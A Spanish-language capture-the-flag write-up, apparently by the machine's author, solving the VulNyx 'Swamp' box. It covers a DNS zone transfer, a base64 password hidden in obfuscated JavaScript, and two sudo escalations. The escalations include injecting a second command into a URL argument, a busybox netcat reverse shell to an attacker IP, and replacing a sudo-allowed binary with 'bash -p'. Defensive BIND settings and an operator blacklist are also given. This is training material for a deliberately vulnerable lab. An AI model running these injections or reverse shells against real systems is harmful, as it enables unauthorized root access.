# Swamp — VulNyx (Write-up)

## Introducción

Muy buenas y bienvenidos a la resolución de la máquina **Swamp** de VulNyx. Esta es otra de las máquinas que hago para la plataforma; en este caso estaremos resolviendo una de nivel **Low**. Quería hacer una máquina accesible para gente que empieza, pero con algún detallito para no ir con el piloto automático.

A continuación, las técnicas que nos encontraremos. Vamos a poner todas las que hay, como si fuera un pentest:

- **DNS Zone Transfer** — AXFR
- **JavaScript Deobfuscation** — Password Leakage
- **Sudo binary bypass**
    - _Method 1:_ Command Injection
    - _Method 2:_ Deleting binary

---

## Reconocimiento

Lo primero es buscar la IP de la máquina Swamp. Hay varias maneras de hacerlo; en este caso lo haré con la herramienta `fping`, que me gusta mucho para el primer recon de IPs. También se puede hacer con `nmap`, `arp-scan` y varias herramientas más.

Mi IP es la `.130`, así que al realizar el primer escaneo para encontrar las IPs de mi rango, encontramos la `.131`, que es la de la máquina Swamp.

```bash
fping -ag 192.168.93.0/24 2>/dev/null
```

Le realizamos un escaneo básico de Nmap:

```bash
sudo nmap -sCV -p- --open -T5 192.168.93.131
```

### Análisis del escaneo Nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 09:45 CET
Nmap scan report for 192.168.93.131
Host is up (0.00077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
53/tcp open  domain  ISC BIND 9.18.28-1~deb12u2 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.18.28-1~deb12u2-Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://swamp.nyx
MAC Address: 00:0C:29:B6:93:DD (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Cuando nos enfrentamos a una máquina hay que hacer un buen análisis del Nmap. Vamos a separarlo por puerto, versión y la información que nos ha sacado:

|Puerto|Servicio|Observación|
|---|---|---|
|`22/tcp`|OpenSSH 9.2p1|Nada importante por ahora.|
|`53/tcp`|ISC BIND 9.18.28|Hay un **DNS funcionando**, por lo tanto hay que mirar bien este puerto.|
|`80/tcp`|Apache 2.4.62|**Importante** → `http-title: Did not follow redirect to http://swamp.nyx`. Tenemos un dominio `swamp.nyx` que hay que añadir al `/etc/hosts` para ver a dónde nos lleva el redirect.|

Añadimos al `/etc/hosts` el dominio `swamp.nyx`:
```
192.168.93.131  swamp.nyx
```

Ahora, si accedemos a la página web que antes redirigía a `swamp.nyx` y a la que no podíamos acceder, ya carga correctamente.

Veremos esa sección en profundidad más adelante. De momento, lo importante es que tenemos un nombre de dominio enumerado y sabemos que hay un DNS corriendo, así que el siguiente paso es comprobar qué hay montado.

---

## DNS Zone Transfer — AXFR

Uno de los primeros checks que hay que hacer es comprobar si el DNS tiene mal configurada la transferencia de zona. Antes de seguir, vamos a entender qué es una transferencia de zona y qué sucede cuando no está bien configurada.

### ¿Qué es una transferencia de zona?

Se la suele llamar **AXFR**, nombre que se le da por el tipo de solicitud. Se utiliza cuando el DNS principal tiene que replicar la base de datos en los siguientes escenarios:
- Al iniciar el servicio DNS en el servidor secundario.
- Cuando caduca el tiempo de actualización.
- Cuando se guardan cambios en el archivo de zona principal y hay una notificación lista.

Ahora que entendemos cómo funciona: si esta transferencia ha sido mal configurada, podemos intentar hacer una solicitud AXFR al dominio `swamp.nyx` y obtener toda la configuración del dominio DNS.

```bash
dig axfr swamp.nyx @192.168.93.131
```

Transferencia de zona efectuada correctamente. Como podemos ver, hemos sacado la información del DNS principal y obtenido subdominios.

Pero antes de avanzar, vamos a mostrar **por qué** sucede esto en términos técnicos (configuración interna del servidor). Esta configuración se encuentra en el path `/etc/bind/named.conf`:
```conf
options {
    directory "/var/cache/bind";
    allow-query { any; };    # Permite que cualquiera realice consultas DNS
    allow-transfer { any; }; # Permite transferencias de zona a cualquier cliente (VULNERABLE)
    recursion yes;
};

zone "swamp.nyx" IN {
    type master;
    file "/etc/bind/db.swampo.nyx";
    allow-transfer { any; }; # Permite transferencias de zona a cualquier cliente (VULNERABLE)
};
```

En esta máquina, obviamente, ha sido exagerado para que funcione el 100% de la transferencia (es súper vulnerable 😄).

### Prevención y explicación detallada

Aquí muestro cómo **debería** configurarse y las queries clave para que sea segura:
```conf
# /etc/named.conf
acl trusted-nameservers {
  192.168.0.10; // ns2
  192.168.1.20; // ns3
};

zone "swamp.nyx" {
  type master;
  file "zones/swamp.nyx";
  allow-transfer { trusted-nameservers; };
};
```

La clave está en la primera parte: estamos creando una sección de servidores de confianza, es decir, los DNS secundarios que van a recibir la petición AXFR. La otra parte importante es la query `allow-transfer { trusted-nameservers; };`, que antes estaba en `any` y ahora apunta a los nameservers que hayamos definido arriba. Si otra petición AXFR es solicitada y no proviene de uno de esos nameservers, **no funcionará**.

### Extracción de subdominios

Cogemos los subdominios y los ponemos en el `/etc/hosts`. Para sacarlos más fácilmente, utilizamos la siguiente query:
```bash
dig axfr swamp.nyx @192.168.93.131 | awk '{print $1}' | grep -E '^[a-zA-Z0-9.-]+\.$' | sed 's/\.$//'
```

Desglose del comando:
- **`dig axfr swamp.nyx @192.168.93.131`** → Ejecuta una transferencia de zona (AXFR) desde el servidor DNS `192.168.93.131` para el dominio `swamp.nyx`.
- **`awk '{print $1}'`** → Extrae solo la primera columna de la salida, que usualmente contiene los nombres de dominio (subdominios incluidos).
- **`grep -E '^[a-zA-Z0-9.-]+\.$'`** → Filtra las líneas que parecen nombres de dominio válidos. El patrón asegura que se seleccionen solo líneas con caracteres alfanuméricos, guiones o puntos, que terminen con un punto.
- **`sed 's/\.$//'`** → Elimina el punto final (`.`) de cada línea. La expresión `\.$` busca un punto al final de la línea, y `s/\.$//` lo reemplaza por nada.

---

## Web Recon

Ahora vamos a acceder a cada subdominio. Antes de eso abrimos **BurpSuite**, y mi recomendación es hacerlo con el navegador que da el propio programa; a mí, al menos, se me hace más fácil que tener que usar FoxyProxy.

Al ser un writeup, vamos un poco a saco en esta parte, porque todos los subdominios son ambientación de la película _Shrek_. El subdominio importante es **`farfaraway.swamp.nyx`**, que es donde encontraremos el path para avanzar.

No obstante, vale la pena comentar que mientras tenemos BurpSuite abierto y entramos en cada subdominio, BurpSuite por defecto hace el _crawling_ básico de la página, mostrando los directorios y archivos que se cargan por defecto. Esto va apareciendo en `Target > Sitemap`.

De hecho, lo comento porque en el subdominio `farfaraway`, simplemente por acceder, ya nos aparece el archivo que vamos a analizar.

---

## JavaScript Deobfuscation — Password Leakage

Accedemos desde la página web y entramos al `script.min.js`. Cuando entramos, realmente no podemos leer ni entender nada del script.

Lo cogemos y vamos a [https://beautifier.io/](https://beautifier.io/), que nos permitirá verlo un poco mejor ("bonito" y más legible). Seguimos sin entender mucho: esto es porque ha sido **ofuscado**. Si nos fijamos, los ofuscadores suelen dejar un rastro al principio del script.

Buscamos en Google _"Unpacker JavaScript"_ → [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)

Pegamos el JavaScript, lo desofuscamos y lo volvemos a pasar por el beautify para ver si podemos leer algo mejor:

```javascript
!function() {
    var e;
    new Promise((e, t) => {
        setTimeout(() => {
            e("Value is positive: 5")
        }, 1e3)
    }).then(e => {
        console.log(e)
    }).catch(e => {
        console.error(e)
    });

    let t = async e => {
        try {
            let t = await (await fetch(e)).json();
            console.log("Data fetch success:", t)
        } catch (o) {
            console.error("Error fetching data:", o)
        }
    };
    t("https://jsonplaceholder.typicode.com/posts");

    (() => {
        let e = document.createElement("div");
        e.innerHTML = "Dynamically added text to the DOM";
        document.body.appendChild(e)
    })();

    class o {
        constructor(e, t) {
            this.name = e, this.sound = t
        }
        speak() {
            console.log(`${this.name} says: ${this.sound}`)
        }
    }
    let a = new o("Dog", "Woof"),
        l = new o("Cat", "Meow");
    a.speak(), l.speak();

    let r = [1, 2, 3, 4, 5],
        n = r.map(e => 2 * e);
    console.log("Doubled numbers:", n);
    let s = r.reduce((e, t) => e + t, 0);
    console.log("Sum of numbers:", s);

    console.log("Updated user:", {
        name: "John",
        age: 30,
        country: "USA"
    });
    setInterval(() => {
        console.log("This message repeats every 2 seconds")
    }, 2e3);
    document.addEventListener("click", () => {
        console.log("Click detected on the document")
    });

    let g = new Date;
    console.log("Current date:", g.toString());
    let i = new Date(g.getFullYear() + 1, g.getMonth(), g.getDate());
    console.log("Future date:", i.toString());

    let c = e => {
        e % 2 == 0 ? console.log(e + " is even") : console.log(e + " is odd")
    };
    [10, 21, 32, 43, 54].forEach(c);
    setTimeout(() => {
        console.log("This runs after 3 seconds")
    }, 3e3);

    (e => {
        let t = e(10, 20);
        console.log("Result from higher-order function:", t)
    })((e, t) => e + t);

    let {
        firstName: d,
        lastName: u,
        age: h
    } = {
        firstName: "Jane",
        lastName: "Doe",
        age: 25
    };
    console.log(`Destructuring: ${d} ${u}, Age: ${h}`);

    let m = new Map;
    m.set("name", "Shrek"), m.set("age", 30), m.set("location", "Far Far Away");
    console.log("Map values:");
    m.forEach((e, t) => {
        console.log(t + ": " + e)
    });

    let p = new Set([1, 2, 3, 4, 4, 5]);
    console.log("Set values (no duplicates):", Array.from(p));

    let $ = function* e() {
        yield "First part", yield "Second part", yield "Third part"
    }();
    console.log($.next().value), console.log($.next().value), console.log($.next().value);

    console.log("Hello, John! Welcome to the page.");

    Password: c2hyZWs6cHV0b3Blc2FvZWxhc25v;

    let f = JSON.parse('{"name": "Shrek", "age": 30}');
    console.log("Parsed JSON data:", f);

    "geolocation" in navigator ? navigator.geolocation.getCurrentPosition(e => {
        console.log("Your current location:", e.coords.latitude, e.coords.longitude)
    }, e => {
        console.error("Error getting location:", e)
    }) : console.log("Geolocation not available");

    let v = "    JavaScript is fun!   ",
        y = v.trim();
    console.log("Trimmed string:", y);
    let S = v.toUpperCase();
    console.log("Uppercase string:", S);

    localStorage.setItem("user", JSON.stringify({ name: "Shrek", age: 30 }));
    let w = JSON.parse(localStorage.getItem("user"));
    console.log("Stored user in localStorage:", w);

    console.log("Random number:", Math.random());
    console.log("Square root of 16:", Math.sqrt(16));
    console.log("PI value:", Math.PI)
}();
```

En medio de todo ese ruido aparece la línea clave:
```javascript
Password: c2hyZWs6cHV0b3Blc2FvZWxhc25v;
```

Esa cadena `c2hyZWs6cHV0b3Blc2FvZWxhc25v` tiene toda la pinta de un **base64**. La desciframos con:
```bash
echo -n "c2hyZWs6cHV0b3Blc2FvZWxhc25v" | base64 -d
```

Obtenemos las credenciales del usuario:
```
shrek:putopesaoelasno
```

Intentamos hacer login (SSH) con la contraseña obtenida y entramos como `shrek`.

---

## Privilege Escalation

### Method 1: Bypass parameter via Command Injection

Estando en el directorio `/home/shrek` tenemos un binario con **SUID**.

Viéndolo así, a muchos os puede venir a la cabeza que si este binario ejecuta de alguna manera algún comando del sistema, y ese comando ha sido escrito de manera **relativa** y no **absoluta**, podría haber un **Path Hijacking**:

- **Absoluta** → `/usr/bin/curl`
- **Relativa** → `curl`

Vamos a ver qué ejecuta de manera básica. Abajo nos da un ejemplo de cómo hacer una petición a las cabeceras de una página web; lo probamos:

```bash
./header_checker --url "google.com"
```

Parece que está haciendo un `curl`. Como decía: si el `curl` estuviera escrito como `curl` (relativo) en vez de `/usr/bin/curl`, se podría hacer Path Hijacking. Pero en este caso no, ya que simplemente lo puse como SUID para engañar un poquito y que perdierais el tiempo con el Path Hijacking, ya que es **Low** 🎉.

Tenemos que ver el `sudo` del usuario `shrek`:

```bash
sudo -l
```

Podemos ejecutar **sin contraseña** el binario `/home/shrek/header_checker` como root. Toca ver si alguno de los parámetros se puede abusar de alguna manera que nos dé root.

Ninguno de los parámetros parece abusable directamente. Una de las opciones, sabiendo que ejecuta el comando `curl` por detrás, es **bypassear** con algún operador el comando e inyectar un comando después del `curl`, ya que por detrás realmente está haciendo esto:

```bash
/usr/bin/curl -I --max-time 10 google.es
```

Nosotros podríamos inyectar después de este comando un `whoami` para ver si el `curl` ha sido sanitizado y no permite este tipo de inyecciones. Por detrás quedaría:

```bash
/usr/bin/curl -I --max-time 10 google.es; whoami
```

Comando en el binario:

```bash
sudo /home/shrek/header_checker --url "google.es; whoami"
```

Por detrás, en el binario, se representa así:

```bash
sudo /home/shrek/header_checker --url "/usr/bin/curl -I --max-time 10 google.es; whoami"
```

Nos aprovechamos de que **no ha sido sanitizado correctamente** y permite inyectar un comando después del `curl`. Esto se arreglaría con una blacklist/whitelist vetando los operadores comunes. Ejemplo:

```bash
blacklist=(";" "|" "&" "`" "$(" "{" "}" "[" "]" "<" ">")
```

Ahora sería tan fácil como mandarnos una reverse shell. En vez del `whoami`, ponemos la vieja confiable `busybox` y recibimos la shell:

```bash
sudo /home/shrek/header_checker --url "google.es; busybox nc 192.168.93.130 4444 -e sh"
```

Conseguimos la shell como **root**.

### Method 2: Deleting binary

Al ser usuario `shrek` y tener posesión total de la carpeta `/home/shrek`, aunque un archivo lo haya creado root, tenemos permisos para borrarlo sin problemas.

Aquí viene el segundo método de escalar privilegios. Sabemos que podemos ejecutar como root, sin proporcionar contraseña, el binario `/home/shrek/header_checker`. Así que si lo **eliminamos** y ponemos un archivo que se llame exactamente igual con lo que queramos dentro, podemos hacer que ese `header_checker` nuevo ejecute, por ejemplo, `chmod u+s /bin/bash` o una `bash -p`, lo que nos daría acceso directo a root.

Creamos el nuevo:

```bash
touch header_checker | echo -n "/bin/bash -p" > header_checker
```

Y con eso completamos la segunda vía de escalada a **root**.

---

_Write-up de la máquina **Swamp** — VulNyx · Nivel: Low._